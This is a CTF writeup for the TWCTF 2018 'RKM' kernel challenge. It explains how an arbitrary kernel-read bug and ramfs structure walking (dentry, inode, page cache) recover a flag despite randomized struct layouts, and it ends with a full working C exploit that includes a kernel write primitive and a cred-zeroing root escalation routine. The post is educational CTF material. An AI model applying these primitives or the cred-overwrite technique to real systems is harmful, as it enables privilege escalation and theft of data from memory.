---
title: "TWCTF-2018 RKM (ReadableKernelModule) writeup"
date: 2018-09-09
categories:
- TWCTF
- TWCTF-2018
- writeup
tags:
- TWCTF
- TWCTF-2018
- writeup
keywords:
- TWCTF
- TWCTF-2018
- writeup
autoThumbnailImage: false
thumbnailImagePosition: "top"
thumbnailImage: https://avatars3.githubusercontent.com/u/5594144?s=400&v=4
coverImage: //d1u9biwaxjngwg.cloudfront.net/welcome-to-tranquilpeak/city.jpg

metaAlignment: center
---
<!--more-->
# TWCTF 2018 RKM (ReadableKernelModule) Writeup

Thanks @Garyo for this great challenge which makes me understand about initramfs more than ever. :)

## Introduction

This challenge is modified from previous [CSAW 2015 kernel challenge](https://github.com/mncoppola/StringIPC) but without any write functionalities provided.

Bug is the same, not changed. For more information, you can refer to writeups about the orriginal challenge, I'm not gonna talk about the original challenge here.

With the exact same bug, we can do arbitrary read access, but since no more write access provided, we cannot do any write.

It firstly seems to be impossible to pwn without write, but since it is tagged as "misc" along with "pwn", we may need to think about this a different way which may not give us root access but to read flag directly.

## First glance

Alright, so far so good, no write, just arbitrary read. But note that this whole thing, kernel along with its filesystem is **ALL IN MEMORY**. From the `run.sh` provided, we can see that:

```
qemu-system-x86_64 -kernel bzImage -m 64M -initrd rootfs.cpio -append "root=/dev/ram console=ttyS0 oops=panic panic=1 quiet kaslr" -nographic -monitor /dev/null -net user -net nic -device e1000 -smp cores=2,threads=2 -cpu kvm64,+smep,+smap 2>/dev/null
```

There is a parameter to the kernel saying "root=/dev/ram", which asks the kernel to use ram as the disk. Since we now have arbitrary read, we can basically read anything as long as it is in ram, so we can definitely read the flag.

So, I know some of the teams just did it by bruteforce the whole memory expansion and try to find out the flag by checking the signature "TWCTF". The author thought the same way, but still, I thought this method is too slow to use. We firstly thought this is impossible since it may be TOO slow, however it works... So I failed to solve this challenge during the CTF. After it, I have enough time research on this, so I use another way.

## ramfs

Now, we know that flag must be in ram somewhere, but we know nothing about ramfs (at least I know nothing about it during CTF..).

I searched some documentation, and it helped, like [like one](https://wiki.debian.org/ramf://wiki.debian.org/ramfs):

> Ramfs is a very simple FileSystem that exports Linux's disk cacheing mechanisms (the page cache and dentry cache) as a dynamically resizable ram-based filesystem.

> With ramfs, there is no backing store.

So, I now know that this ramfs is using only caches without backing store, great. And it's a filesystem, fantastic.

A linux filesystem must have some important structures, like `dentry` and `inode`, so our first job is clear. We need to find these metadata of the flag file before anything else.

## Long way of searching...

From now on, things are actually getting bored.. We first need to find out the path from some global variable to the `inode` at least.

By doing searching and searching, I used `init_task` global variable as a start.

Other process of finding "flag" file inode can be described like this:

```
init_task.fs (fs_struct) -> 
fs_struct.root (path) ->
path.dentry (dentry) ->
dentry.d_subdirs (list_head of dentry)
// now search dentry.d_name, see which one is flag, since flag is under "/"
--> (search) --> (after search, we get flag's dentry)
dentry.d_inode (inode)
```

This process is quite clear, once you get the structure definition, it is easy to find the next field you should use. But I really hope things to be that simple..

There is a mechanism called "randomized layout" within kernel. For example, the `dentry`:

```
struct dentry {
	/* RCU lookup touched fields */
	unsigned int d_flags;		/* protected by d_lock */
	seqcount_t d_seq;		/* per dentry seqlock */
	struct hlist_bl_node d_hash;	/* lookup hash list */
	struct dentry *d_parent;	/* parent directory */
	struct qstr d_name;
	struct inode *d_inode;		/* Where the name belongs to - NULL is
					 * negative */
	unsigned char d_iname[DNAME_INLINE_LEN];	/* small names */

	/* Ref lookup also touches following */
	struct lockref d_lockref;	/* per-dentry lock and refcount */
	const struct dentry_operations *d_op;
	struct super_block *d_sb;	/* The root of the dentry tree */
	unsigned long d_time;		/* used by d_revalidate */
	void *d_fsdata;			/* fs-specific data */

	union {
		struct list_head d_lru;		/* LRU list */
		wait_queue_head_t *d_wait;	/* in-lookup ones only */
	};
	struct list_head d_child;	/* child of parent list */
	struct list_head d_subdirs;	/* our children */
	/*
	 * d_alias and d_rcu can share memory
	 */
	union {
		struct hlist_node d_alias;	/* inode alias list */
		struct hlist_bl_node d_in_lookup_hash;	/* only for in-lookup ones */
	 	struct rcu_head d_rcu;
	} d_u;
} __randomize_layout; //  NOTE THIS!
```

The last line, we see a "__randomize_layout" there, which means this structure's field is randomized. So, we can't get the offset directly to access its field..

Hopefully, we are not screwed. There are many places within kernel itself accessing field of such type, which leaves us opportunity to find out exact offset.

Since I haven't recorded the whole process of finding all this offset, I'll use an example of finding `d_name` offset in `dentry` to illustrate this process.. (It is actually quite a long way to search through all this...)

I grepped "d_name" within my kernel source, and find it in "/fs/dcache.c", referenced by a function called `__d_alloc`. I picked this one, mostly because it uses `dentry->d_name.name". Its exactly what I need, and its exported, so we'll know where exactly it is.

[source](https://elixir.bootlin.com/linux/v4.15-rc9/source/fs/dcache.c#L163://elixir.bootlin.com/linux/v4.15-rc9/source/fs/dcache.c#L1633)

```c
    dentry->d_name.len = name->len;
	dentry->d_name.hash = name->hash;
	memcpy(dname, name->name, name->len);
	dname[name->len] = 0;

	/* Make sure we always see the terminating NUL character */
	smp_wmb();
	dentry->d_name.name = dname;
```

Then I opened the kernel in IDA, jump to this function. I wrote a [script](https://github.com/Escapingbug/scripts/tree/master/linux/kernel/export_symbol) to rename these exported functions.

After several analysis, I'm sure the offsets are like this:

```
    *(_DWORD *)(v5 + 0x24) = v6;                // dname.len
    *(_DWORD *)(v5 + 0x20) = v9;                // dname.hash
    dname_ = (char *)memcpy(dname, v8, namelen);
    dname_[namelen] = 0;
    *(_QWORD *)(v5 + 0x28) = dname_; // dentry->d_name.name = dname
```

So, `dentry->d_name.len` is at `dentry + 0x24`, `dentry->d_name.hash` is at `dentry + 0x20` and `dentry->d_name.name` is at `dentry + 0x28`.

Now I can do dynamic stuff, checking it out..

For example, the root:

```
0xffff9ed702008000     00 00 21 00 02 00 00 00 00 00 00 00 00 00 00 00     ..!.............
0xffff9ed702008010     00 00 00 00 00 00 00 00 00 80 00 02 d7 9e ff ff     ................
0xffff9ed702008020     00 00 00 00 01 00 00 00 38 80 00 02 d7 9e ff ff     ........8....... // Here 0x24 ~ 0x28 is length, which is one
// And 0x28 is the pointer to name, which points to 0x38
0xffff9ed702008030     00 40 00 02 d7 9e ff ff 2f 00 bc 13 6a 9b d5 27     .@....../...j..' // Here 0x38 is told to be name, which is "/" here.
```

And behold! Here it is.

This is just a simple illustration of what I did to get all the offset, and it is really a long way to go. Since many structures are randomized.

Anyway, I got the inode. But where is the memory?

## From inode to memory, another long race..

This is what made me stuck during CTF, or else I could solve this challenge.

We now know how to get the inode, but memory address information is not in it. Checkout `inode` structure, I got this:

```
struct inode {
	...
	struct address_space    *i_mapping;
	...
} __randomize_layout;
```

My guess was that this field could tell me where the address is. And go on:

```
struct address_space {
	struct inode		*host;		/* owner: inode, block_device */
	struct radix_tree_root	page_tree;	/* radix tree of all pages */
	spinlock_t		tree_lock;	/* and lock protecting it */
	atomic_t		i_mmap_writable;/* count VM_SHARED mappings */
	struct rb_root_cached	i_mmap;		/* tree of private and shared mappings */
	struct rw_semaphore	i_mmap_rwsem;	/* protect tree, count, list */
	/* Protected by tree_lock together with the radix tree */
```

There is a `page_tree`, which is a `radix_tree_root`. Since its name is page, I'm looking forward to get a page struct out of it. But it is wrapped in `radix_tree_root`. Flag is not long, so there must be only one page within, it seemed quite easy at that time..

Let's look at that `radix_tree_root` definition:

```
struct radix_tree_root {
	gfp_t			gfp_mask;
	struct radix_tree_node	__rcu *rnode;
};

struct radix_tree_node {
	unsigned char	shift;		/* Bits remaining in each slot */
	unsigned char	offset;		/* Slot offset in parent */
	unsigned char	count;		/* Total entry count */
	unsigned char	exceptional;	/* Exceptional entry count */
	struct radix_tree_node *parent;		/* Used when ascending tree */
	struct radix_tree_root *root;		/* The tree we belong to */
	union {
		struct list_head private_list;	/* For tree user */
		struct rcu_head	rcu_head;	/* Used when freeing node */
	};
	void __rcu	*slots[RADIX_TREE_MAP_SIZE];
	unsigned long	tags[RADIX_TREE_MAX_TAGS][RADIX_TREE_TAG_LONGS];
};
```

No randomized layout, good. Then I dumped the node:

```
0xffffd94d000772c0     38 00 00 00 00 00 00 40 60 53 09 02 d7 9e ff ff     8......@`S......  
0xffffd94d000772d0     00 00 00 00 00 00 00 00 ff ff ff ff 01 00 00 00     ................  
0xffffd94d000772e0     a0 72 07 00 4d d9 ff ff 20 66 06 00 4d d9 ff ff     .r..M... f..M...  
0xffffd94d000772f0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00     ................  
```

What is that "ff ff ff ff 01 00 00 00"?? It should be that union, but both unions are two pointers, this value cannot be pointers.. So I am really confused of how to parse this thing...

Good news that, till now I get get the `radix_tree_root`, then @Garyo told me that there is a function called "find_get_entry". I checked it, the comments were very clear:

```
/**
 * find_get_entry - find and get a page cache entry
 * @mapping: the address_space to search
 * @offset: the page cache index
 *
 * Looks up the page cache slot at @mapping & @offset.  If there is a
 * page cache page, it is returned with an increased refcount.
 *
 * If the slot holds a shadow entry of a previously evicted page, or a
 * swap entry from shmem/tmpfs, it is returned.
 *
 * Otherwise, %NULL is returned.
 */
struct page *find_get_entry(struct address_space *mapping, pgoff_t offset)
{
```

So, what I did is to setup a breakpoint there, like this:

```
break *[address of find_get_entry] if $rdi==[address of i_mapping I found]
```

Then I got it to break. And with gdb's help, I could trace through this function, and get the offset to real page struct offset, turn out to be just the address after `radix_tree_node->gfp_mask` within `radix_tree_root`... This was to say, what we got earlier, was not a `radix_tree_node`, but `struct page`...Ummmmm. That explains...

Now we got the page struct, how to get the address? This was a little bit tricky, since while I was tracing through the `find_get_entry` function, I didn't stop after it returned, with my eyes staring on new addresses. Suddenly after some magic function at `0xffffffff81203ba0`(When base is `0xffffffff81000000`, my ida is not working properly, I can't rebase it), the returned value was new, and it pointted to flag content!

Then I looked inside, got assembly like this:

```
// r8 is our input, which is the address of our page struct
 .text:FFFFFFFF81203BC1                 mov     r10, cs:page_offset_base
 .text:FFFFFFFF81203BC8                 lea     r9, [rdx-1]
 .text:FFFFFFFF81203BCC                 and     edx, 1
 .text:FFFFFFFF81203BCF                 lea     rdx, [rsi+r14]
 .text:FFFFFFFF81203BD3                 cmovz   r9, rdi
 .text:FFFFFFFF81203BD7                 mov     rdi, cs:vmemmap_base
 .text:FFFFFFFF81203BDE                 sub     r8, rdi
 .text:FFFFFFFF81203BE1                 sar     r8, 6
 .text:FFFFFFFF81203BE5                 shl     r8, 0Ch
 .text:FFFFFFFF81203BE9                 add     r8, r10
```

After this gadget, `r8` is the pointer to flag content.

Then it was done, but I'm gonna admit that I still don't know why this happens.

## Sum up exploit process

```
init_task.fs (fs_struct) -> 
fs_struct.root (path) ->
path.dentry (dentry) ->
dentry.d_subdirs (list_head of dentry)

// now search dentry.d_name, see which one is flag, since flag is under "/"
--> (search) --> (after search, we get flag's dentry)

dentry.d_inode (inode) ->
inode.i_mapping (address_space) ->
address_space.page_tree (radix_tree_root) ->
radix_tree_root.rnode (page) ->

// calculate the real address using global variable page_offset_base and vmemmap_base
flag_addr -> flag_content
```

## Exploit

```

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <time.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>

#define CHECKED(_val, err) \
  if (_val < 0) { \
    printf(err); \
    printf(" error\n"); \
    exit(-1); \
  }

#define PAGE_SIZE getpagesize()
#define PAGE_OFFSET 0xffffffff81000000
#define BUF_SIZE PAGE_SIZE

#define TASK_COMM_LEN 16

#define CSAW_IOCTL_BASE     0x77617363
#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1
#define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2
#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3
#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4
#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5
#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6
#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7
#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8

struct alloc_channel_args {
    size_t buf_size;
    int id;
};

struct open_channel_args {
    int id;
};

struct grow_channel_args {
    int id;
    size_t size;
};

struct shrink_channel_args {
    int id;
    size_t size;
};

struct read_channel_args {
    int id;
    char *buf;
    size_t count;
};

struct write_channel_args {
    int id;
    char *buf;
    size_t count;
};

struct seek_channel_args {
    int id;
    loff_t index;
    int whence;
};

struct close_channel_args {
    int id;
};

void error ( char *msg )
{
    perror(msg);
    exit(EXIT_FAILURE);
}

void hexdump ( char *addr, unsigned int length )
{
    unsigned int i, j;

    for ( i = 0; i < length / 16; i++ )
    {
        for ( j = 0; j < 16; j++ )
        {
            printf("%02hhx ", addr[i * 16 + j]);
        }
        printf("\n");
    }
}

int read_kernel_memory ( int fd, int id, unsigned long kaddr, void *buf, unsigned int size )
{
    int ret;
    struct seek_channel_args seek_channel;
    struct read_channel_args read_channel;

    memset(&seek_channel, 0, sizeof(seek_channel));
    seek_channel.id = id;
    seek_channel.index = kaddr - 0x10;
    seek_channel.whence = SEEK_SET;

    ioctl(fd, CSAW_SEEK_CHANNEL, &seek_channel);

    memset(&read_channel, 0, sizeof(read_channel));
    read_channel.id = id;
    read_channel.buf = buf;
    read_channel.count = size;

    ret = ioctl(fd, CSAW_READ_CHANNEL, &read_channel);

    return ret;
}

int write_kernel_null_byte ( int fd, int id, unsigned long kaddr )
{
    int ret;
    char null_byte = 0;
    struct seek_channel_args seek_channel;
    struct write_channel_args write_channel;

    /*
     * The write primitive uses strncpy_from_user(), so we can't write full
     * dwords containing a null terminator. The exploit only needs to write
     * zeroes anyhow, so this function just passes a single null byte.
     */

    memset(&seek_channel, 0, sizeof(seek_channel));
    seek_channel.id = id;
    seek_channel.index = kaddr - 0x10;
    seek_channel.whence = SEEK_SET;

    ioctl(fd, CSAW_SEEK_CHANNEL, &seek_channel);

    memset(&write_channel, 0, sizeof(write_channel));
    write_channel.id = id;
    write_channel.buf = &null_byte;
    write_channel.count = sizeof(null_byte);

    ret = ioctl(fd, CSAW_WRITE_CHANNEL, &write_channel);

    return ret;
}

void escalate_creds ( int fd, int id, unsigned long cred_kaddr )
{
    unsigned int i;
    unsigned long tmp_kaddr;

    /*
     * The cred struct looks like:
     *
     *     atomic_t    usage;
     *     kuid_t      uid;
     *     kgid_t      gid;
     *     kuid_t      suid;
     *     kgid_t      sgid;
     *     kuid_t      euid;
     *     kgid_t      egid;
     *     kuid_t      fsuid;
     *     kgid_t      fsgid;
     *
     * where each field is a 32-bit dword.  Skip the first field and write
     * zeroes over the id fields to escalate to root.
     */

    /* Skip usage field */

    tmp_kaddr = cred_kaddr + sizeof(int);

    /* Now overwrite the id fields */

    for ( i = 0; i < (sizeof(int) * 8); i++ )
        write_kernel_null_byte(fd, id, tmp_kaddr + i);
}

void gen_rand_str ( char *str, unsigned int len )
{
    unsigned int i;

    for ( i = 0; i < (len - 1); i++ )
        str[i] = (rand() % (0x7e - 0x20)) + 0x20;

    str[len - 1] = 0;
}

int main ( int argc, char **argv )
{
    int ret, fd, id;
    unsigned long offset;
    char *addr, *ceiling;
    struct alloc_channel_args alloc_channel;
    struct shrink_channel_args shrink_channel;
    char comm[TASK_COMM_LEN];

    /* Set comm to random signature */

	/*
    srand(time(NULL));

    gen_rand_str(comm, sizeof(comm));

    printf("Generated comm signature: '%s'\n", comm);

    ret = prctl(PR_SET_NAME, comm);
    if ( ret < 0 )
       error("prctl");
	*/

    /* Open device */

    fd = open("/dev/csaw", O_RDONLY);
    if ( fd < 0 )
        error("open");

    /* Allocate IPC channel */

    memset(&alloc_channel, 0, sizeof(alloc_channel));
    alloc_channel.buf_size = 1;

    ret = ioctl(fd, CSAW_ALLOC_CHANNEL, &alloc_channel);
    if ( ret < 0 )
        error("ioctl");

    id = alloc_channel.id;

    printf("Allocated channel id %d\n", id);

    /* Shrink channel to -1 */

    memset(&shrink_channel, 0, sizeof(shrink_channel));
    shrink_channel.id = id;
    shrink_channel.size = 2;

    ret = ioctl(fd, CSAW_SHRINK_CHANNEL, &shrink_channel);
    if ( ret < 0 )
        error("ioctl");

    printf("Shrank channel to -1 bytes\n");

    /* Map buffer for leaking kernel memory to */

    addr = (char *)mmap(NULL, BUF_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
    if ( addr == MAP_FAILED )
        error("mmap");

    ceiling = addr + BUF_SIZE;

    printf("Mapped buffer %p:0x%x\n", addr, BUF_SIZE);

    printf("Scanning kernel memory for comm signature...\n");

    /*
     * We escalate to root by modifying our cred struct in memory.  We first
     * find it by leaking kernel memory one chunk at a time and applying a
     * simple heuristic.
     *
     * Pointers to our creds reside next to the user-controllable comm field in
     * task_struct:
     *
     *     const struct cred __rcu *real_cred;
     *     const struct cred __rcu *cred;
     *     char comm[TASK_COMM_LEN];
     *
     * Scan memory for our unique comm string, then verify that the two prior
     * qwords look like kernel pointers.
     */

    offset = 0;

    /* Anciety starts RKM exploit from here ! */

    unsigned long kernel_addr = 0x0;
    char *ptr;
    unsigned long t_addr;

    /*
     * Found offset 
     * (may not be useful, debug it to make sure it is right, since the format is
     * messy about pointers and pointers to pointers..)
     * (If you only want exact offsets, see exploit process below.. Not this one)
     *
     * init_task @ kernel_addr + 0xc10480
     * fs @ init_task + 0x568
     * root dentry @ fs + 0x30
     * entry name @ dentry + 0x20(0x24?)
     * entry name string @ *(entry name + 0x8(0x4?))
     * subdirs @ dentry + 0xa0
     * dentry payload = subdirs @ subdirs - 0x90
     * subdirs next @ *subdirs
     * subdirs prev @ *(subdirs + 8)
     * inode @ dentry + 0x30
     * inode->i_mapping @ inode + 48
     * inode->i_data @ inode + 352
     * inode->i_data.nrpages @ inode + 440
     * address_space->i_mmap @ address_space + 32
     * page->mapping @ page + 8
     * address_space->radix_tree_root @ address_space + 0
     * radix_tree_root->gfp_mask @ radix_tree_root + 8
     * radix_tree_root->rnode @ radix_tree_root + 16
     */

    /* searching for kernel base */
    while (1) {
    	kernel_addr = PAGE_OFFSET + offset;

    	ret = read_kernel_memory(fd, id, kernel_addr, addr, BUF_SIZE);
    
    	if ( ret < 0 )
    	{
        	offset += 0x100000;
        	continue;
    	}
    	
    	printf("kernel_addr: %lx\n", (unsigned long)kernel_addr);
    	//hexdump(addr, BUF_SIZE);
        break;
    }

    /* long way to get to flag starts.. */
 
    unsigned long init_task_addr = kernel_addr + 0xc10480;

    unsigned long fs_addr = 0;
    ret = read_kernel_memory(fd, id, init_task_addr + 0x568, &fs_addr, 8);
    CHECKED(ret, "read fs");
    printf("fs @ 0x%lx\n", fs_addr);

    unsigned long root_dentry_addr = 0;
    ret = read_kernel_memory(fd, id, fs_addr + 0x30, &root_dentry_addr, 8);
    CHECKED(ret, "read root_dentry");
    printf("root_dentry @ 0x%lx\n", root_dentry_addr);

    /* we now have the root dentry, iterate through its subdirs, see where is the flag dentry */
    unsigned long root_subdirs = 0;
    ret = read_kernel_memory(fd, id, root_dentry_addr + 0xa0, &root_subdirs, 8);
    CHECKED(ret, "read root subdirs");
    printf("root subdirs @ 0x%lx\n", root_subdirs);

    unsigned long subdir = root_subdirs - 0x90;

    char flag_name_test_buf[10];
    unsigned long flag_dentry = 0;

    /* try prevs first, I found it more likely to be in prevs */
    while (1) {
      memset(flag_name_test_buf, 0, 10);
      unsigned int entry_name_size = 0;
      ret = read_kernel_memory(fd, id, subdir + 0x24, &entry_name_size, 4);
      CHECKED(ret, "read entry name size");
      printf("entry name size %d\n", entry_name_size);

      unsigned long entry_name_address = 0;
      ret = read_kernel_memory(fd, id, subdir + 0x24 + 4, &entry_name_address, 8);
      CHECKED(ret, "read entry name address");
      printf("entry name address @ 0x%lx\n", entry_name_address);

      ret = read_kernel_memory(fd, id, entry_name_address, flag_name_test_buf, entry_name_size);
      CHECKED(ret, "read entry name");

      printf("Found entry %s\n", flag_name_test_buf);

      if (!strcmp(flag_name_test_buf, "flag")) {
        /* found it */
        printf("Found flag dentry at 0x%lx\n", subdir);
        flag_dentry = subdir;
        break;
      }

      unsigned long prev = 0;
      ret = read_kernel_memory(fd, id, subdir + 0x90, &prev, 8);
      CHECKED(ret, "read prev");
      printf("prev @ 0x%lx\n", prev);
      /* not found */

      if (!prev) {
        /* no other prevs */
        break;
      }

      subdir = prev - 0x90;
      printf("prev subdir @ 0x%lx\n", subdir);
    }

    unsigned long flag_inode = 0;
    ret = read_kernel_memory(fd, id, flag_dentry + 0x30, &flag_inode, 8);
    CHECKED(ret, "read flag inode");
    printf("flag inode @ 0x%lx\n", flag_inode);
    
    unsigned long flag_imapping = 0;
    ret = read_kernel_memory(fd, id, flag_inode + 48, &flag_imapping, 8);
    CHECKED(ret, "read flag i_mapping");
    printf("flag i_mapping @ 0x%lx\n", flag_imapping);

    unsigned long node_addr = 0;
    ret = read_kernel_memory(fd, id, flag_imapping + 16, &node_addr, 8);
    CHECKED(ret, "read node address");
    printf("flag page address @ 0x%lx\n", node_addr);

    /* copy_page_to_iter @ 0xffffffff81203ba0(in ida, with base 0xffffffff81000000) */
    /* There is logic to get virtual address. copy it! */
    unsigned long page_offset_base_addr = (0xFFFFFFFF81C256B8 - 0xffffffff81000000) + kernel_addr;
    unsigned long vmemmap_base_addr = page_offset_base_addr - 0x10;

    unsigned long page_offset_base = 0;
    unsigned long vmemmap_base = 0;

    ret = read_kernel_memory(fd, id, page_offset_base_addr, &page_offset_base, 8);
    CHECKED(ret, "read page offset base");
    printf("page offset base 0x%lx\n", page_offset_base);

    ret = read_kernel_memory(fd, id, vmemmap_base_addr, &vmemmap_base, 8);
    CHECKED(ret, "read vmemmap base");
    printf("vmemmap base 0x%lx\n", vmemmap_base);

    /* calculate virtual address */
    unsigned long flag_addr = node_addr;
    flag_addr -= vmemmap_base;
    flag_addr >>= 6;
    flag_addr <<= 0xc;
    flag_addr += page_offset_base;
    printf("flag @ 0x%lx\n", flag_addr);

    char *flag_buf = (char*) malloc(0x100);
    ret = read_kernel_memory(fd, id, flag_addr, flag_buf, 0x100);
    CHECKED(ret, "read flag");
    printf("flag: %s\n", flag_buf);
    free(flag_buf);

    return 0;
}
```

## Conclusion

1. Parse fs should be fun.
2. Unless structs are randomized..
3. Randomized structs are still defeatable, if you are a dedicated attacker.

I'm also considering automate this process, since I do think static analysis of code snippets with the help of source code of the kernel can get me out most of the offset...

Special thanks to @monster who gave me the original thought of how to solve this challenge, and @Garyo who gave this interesting challenge and helped me solving this.
